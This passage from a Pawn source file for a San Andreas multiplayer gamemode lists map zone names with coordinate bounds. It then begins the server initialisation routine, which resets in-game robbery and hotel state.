	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
	{"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
	{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
	{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
	{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa Del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial Estate",  {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"The Four Dragons Casino",     {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	// Main Zones
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

public OnGameModeInit()
{
	if(Debug) printf("OnGameModeInit()");

	for(new i;i<MAX_SOYGUN;i++)
	{
		Soygun[i][lider] = -1;
		Soygun[i][oyuncu2] = -1;
		Soygun[i][oyuncu3] = -1;
		Soygun[i][oyuncu4] = -1;
		Soygun[i][oyuncu5] = -1;
		Soygun[i][isyerid] = -1;
		Soygun[i][isyeritip] = -1;
	}

	for(new i=0;i<240;i++) {
		Otel[i][kilitli] = true;
	}
    BlockGarages();
